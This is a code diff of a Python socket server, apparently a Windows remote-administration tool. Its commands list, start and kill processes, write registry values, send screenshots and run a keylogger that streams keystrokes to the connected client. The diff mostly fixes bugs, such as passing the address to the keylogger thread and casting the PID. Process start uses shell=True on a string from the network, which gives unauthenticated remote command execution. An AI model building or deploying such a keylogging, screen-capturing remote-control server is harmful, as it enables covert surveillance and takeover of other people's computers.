@@ -9,9 +9,6 @@ import subprocess
 import re
 import psutil
 import signal
-# from .. import functions
-# from functions import *
-# from functions import regedit
 
 HEADER = 64
 PORT = 5050
@@ -62,7 +59,7 @@ def setValue(path, value_name, dataType, data):
     try:
         reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
         key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
-        wr.SetValueEx(key, value_name, 0, dataType, data)
+        wr.SetValueEx(key, value_name, 0, wr.REG_SZ, data)
         wr.CloseKey(key)
         wr.CloseKey(reg)
         return True
@@ -73,7 +70,7 @@ def createValue(path, value_name, dataType, data):
     try:
         reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
         key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
-        wr.SetValueEx(key, value_name, 0, dataType, data)
+        wr.SetValueEx(key, value_name, 0, wr.REG_SZ, data)
         wr.CloseKey(key)
         wr.CloseKey(reg)
         return True
@@ -160,9 +157,9 @@ def getProcessList():
     for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
         try:
             process_info = {
-                'pid': proc.info['pid'],
-                'name': proc.info['name'],
-                'threads': proc.info['num_threads']
+                'pid': proc.info['pid'], # type: ignore
+                'name': proc.info['name'], # type: ignore
+                'threads': proc.info['num_threads'] # type: ignore
             }
             process_list.append(process_info)
         except psutil.NoSuchProcess:
@@ -170,14 +167,6 @@ def getProcessList():
     return (process_list, len(process_list)) 
 
 def killProcess(pid):
-    """Kills a process with the given pid.
-
-    Args:
-        pid (int): The process id of the process to kill.
-
-    Returns:
-        boolean: True if the process was killed, False otherwise.
-    """
     try:
         os.kill(pid, signal.SIGTERM)
         return True
@@ -185,14 +174,6 @@ def killProcess(pid):
         return False
 
 def startProcess(process_name):
-    """Starts a process with the given name. Note: Dont need to provide the full path to the process if it is in the system path.
-
-    Args:
-        process_name (string): The name/path of the process to start.
-
-    Returns:
-        boolean: True if the process was started, False otherwise.
-    """    
     try:
         subprocess.Popen(process_name, shell=True)
         return True
@@ -203,13 +184,11 @@ def analyzeProcess(msg, connection):
     content = msg.split(',')
     if content[0] == "GETPROCESS":
         process_list, list_len = getProcessList()
-        print(process_list)
         send(connection, str(list_len))
         for item in process_list:
             send(connection, str(item["pid"]))
             send(connection, str(item["name"]))
             send(connection, str(item["threads"]))
-        print('Sent process list')
     elif content[0] == "STARTPROCESS":
         returnVal = startProcess(content[1])
         if returnVal:
@@ -217,7 +196,7 @@ def analyzeProcess(msg, connection):
         else:
             send(connection, f'Error while starting process {content[1]}')
     elif content[0] == "KILLPROCESS":
-        returnVal = killProcess(content[1])
+        returnVal = killProcess(int(content[1]))
         if returnVal:
             send(connection, f'Killed process with pid {content[1]}')
         else:
@@ -234,7 +213,7 @@ def sendScreenShot(connection, address):
     connection.send(str(len(screenshotByte)).encode('utf-8').ljust(64))
     connection.sendall(screenshotByte)
 
-def record_keys(connection):
+def record_keys(connection, address):
     keys_pressed = []
 
     def on_press(key):
@@ -298,7 +277,7 @@ def sendAppList(connection):
         send(connection, item["app_id"])
         send(connection, item["path"])
         send(connection, item["threads"])
-    print("Done sending")
+    # print("Done sending")
 
 def handle_client(connection, address):
     print(f"New connection initialized - {address}.")
@@ -327,7 +306,7 @@ def handle_client(connection, address):
             if (not keylogger_on):
                 print(f"[{address}] - KEYLOG START")
                 keylogger_on = True
-                threading.Thread(target=record_keys, args=(connection)).start()
+                threading.Thread(target=record_keys, args=(connection, address)).start()
             else:
                 print(f"[{address}] - KEYLOG END")
                 keylogger_on = False
